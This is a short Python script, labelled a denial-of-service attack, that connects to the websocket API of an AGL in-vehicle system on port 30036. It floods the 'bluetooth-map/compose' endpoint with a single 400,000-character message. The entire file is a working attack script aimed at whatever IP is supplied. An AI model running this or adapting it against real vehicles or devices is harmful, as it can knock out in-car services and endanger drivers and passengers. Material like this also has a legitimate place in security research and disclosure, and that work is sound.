# DoS Attack - Single, Large payload transmission

import sys
from socket import timeout
from websocket import create_connection, WebSocketBadStatusException

MESSAGE_PORT = 30036
HEADER = {"Content-Type": "application/json"}

def connection(ip, port):
    WEBSOCKET_CR = f"ws://{ip}:{port}/api"
    try:
        return create_connection(WEBSOCKET_CR, timeout = 60)
    except ConnectionRefusedError:
        return False
    except timeout:
        return False
    except WebSocketBadStatusException as err:
        print(f"[ERROR] {err}")

if __name__ == "__main__":
    agl_ip = sys.argv[1]
    conn = connection(agl_ip, MESSAGE_PORT)

    if not conn:
        print("[ERROR] Connection Error, Check Your AGL Internet Connection")
    
    payload = "A" * 400000
    data = '[2, 99999, "bluetooth-map/compose", {"message":"' + payload + '","recipient":"0"}]'
    conn.send(data)